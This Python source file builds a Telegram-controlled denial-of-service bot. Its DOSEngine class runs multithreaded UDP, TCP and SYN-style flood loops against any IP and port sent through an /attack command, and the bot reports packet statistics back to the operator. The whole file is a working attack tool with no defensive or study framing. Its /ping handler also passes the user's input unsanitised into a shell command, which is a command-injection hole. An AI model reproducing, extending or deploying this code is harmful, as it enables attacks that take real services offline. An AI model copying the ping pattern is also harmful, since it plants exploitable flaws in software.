import asyncio
import socket
import threading
import time
import random
import logging
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ─── CONFIG ───────────────────────────────────────────────────
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
AUTHORIZED_USERS = [123456789]  # your telegram user id

# ─── ATTACK ENGINE ────────────────────────────────────────────
class DOSEngine:
    def __init__(self):
        self.running = False
        self.threads = []
        self.stats = {"sent": 0, "errors": 0, "start_time": None}

    def _udp_flood(self, target_ip, target_port, stop_event):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random.randbytes(1024)
        while not stop_event.is_set():
            try:
                sock.sendto(payload, (target_ip, target_port))
                self.stats["sent"] += 1
            except Exception:
                self.stats["errors"] += 1
        sock.close()

    def _tcp_flood(self, target_ip, target_port, stop_event):
        while not stop_event.is_set():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target_ip, target_port))
                sock.send(random.randbytes(512))
                sock.close()
                self.stats["sent"] += 1
            except Exception:
                self.stats["errors"] += 1

    def _syn_flood(self, target_ip, target_port, stop_event):
        """Raw SYN-style via rapid TCP half-opens"""
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)
                s.connect_ex((target_ip, target_port))
                self.stats["sent"] += 1
                s.close()
            except Exception:
                self.stats["errors"] += 1

    def start(self, target_ip, target_port, thread_count=200, mode="udp"):
        if self.running:
            return False
        self.running = True
        self.stop_event = threading.Event()
        self.stats = {"sent": 0, "errors": 0, "start_time": time.time()}

        attack_fn = {
            "udp": self._udp_flood,
            "tcp": self._tcp_flood,
            "syn": self._syn_flood,
        }.get(mode, self._udp_flood)

        for _ in range(thread_count):
            t = threading.Thread(
                target=attack_fn,
                args=(target_ip, target_port, self.stop_event),
                daemon=True
            )
            t.start()
            self.threads.append(t)

        logger.info(f"[+] Attack started → {target_ip}:{target_port} | {thread_count} threads | mode={mode}")
        return True

    def stop(self):
        if not self.running:
            return False
        self.stop_event.set()
        self.running = False
        self.threads.clear()
        logger.info("[+] Attack stopped")
        return True

    def get_stats(self):
        elapsed = round(time.time() - self.stats["start_time"], 2) if self.stats["start_time"] else 0
        pps = round(self.stats["sent"] / elapsed, 2) if elapsed > 0 else 0
        return {
            "sent": self.stats["sent"],
            "errors": self.stats["errors"],
            "elapsed": elapsed,
            "pps": pps,
            "running": self.running
        }


engine = DOSEngine()

# ─── AUTH CHECK ───────────────────────────────────────────────
def authorized(update: Update) -> bool:
    return update.effective_user.id in AUTHORIZED_USERS

# ─── TELEGRAM HANDLERS ────────────────────────────────────────
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    msg = (
        "🔥 *DOS Engine — Online*\n\n"
        "`/attack <ip> <port> <threads> <mode>`\n"
        "modes: `udp` `tcp` `syn`\n\n"
        "`/stop` — kill attack\n"
        "`/stats` — live stats\n"
        "`/ping <ip>` — check target ping"
    )
    await update.message.reply_text(msg, parse_mode="Markdown")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /attack <ip> <port> [threads] [mode]")
        return

    ip = args[0]
    port = int(args[1])
    threads = int(args[2]) if len(args) > 2 else 200
    mode = args[3] if len(args) > 3 else "udp"

    ok = engine.start(ip, port, threads, mode)
    if ok:
        await update.message.reply_text(
            f"🚀 *Attack launched*\n"
            f"Target: `{ip}:{port}`\n"
            f"Threads: `{threads}`\n"
            f"Mode: `{mode}`",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("⚠️ Attack already running. /stop first.")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    ok = engine.stop()
    if ok:
        s = engine.get_stats()
        await update.message.reply_text(
            f"🛑 *Attack stopped*\n"
            f"Packets sent: `{s['sent']}`\n"
            f"Errors: `{s['errors']}`\n"
            f"Duration: `{s['elapsed']}s`\n"
            f"Avg PPS: `{s['pps']}`",
            parse_mode="Markdown"
        )
    else:
        await update.message.reply_text("No active attack.")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    if not engine.running:
        await update.message.reply_text("No attack running.")
        return
    s = engine.get_stats()
    await update.message.reply_text(
        f"📊 *Live Stats*\n"
        f"Packets: `{s['sent']}`\n"
        f"Errors: `{s['errors']}`\n"
        f"Elapsed: `{s['elapsed']}s`\n"
        f"PPS: `{s['pps']}`\n"
        f"Status: `{'🔴 RUNNING' if s['running'] else '🟢 STOPPED'}`",
        parse_mode="Markdown"
    )

async def ping_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not authorized(update):
        return
    if not context.args:
        await update.message.reply_text("Usage: /ping <ip>")
        return
    ip = context.args[0]
    proc = await asyncio.create_subprocess_shell(
        f"ping -c 4 {ip}",
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, _ = await proc.communicate()
    result = stdout.decode()
    await update.message.reply_text(f"```\n{result[:3000]}\n```", parse_mode="Markdown")

# ─── MAIN ─────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("stats", stats))
    app.add_handler(CommandHandler("ping", ping_check))
    logger.info("[*] Bot polling...")
    app.run_polling()

if __name__ == "__main__":
    main()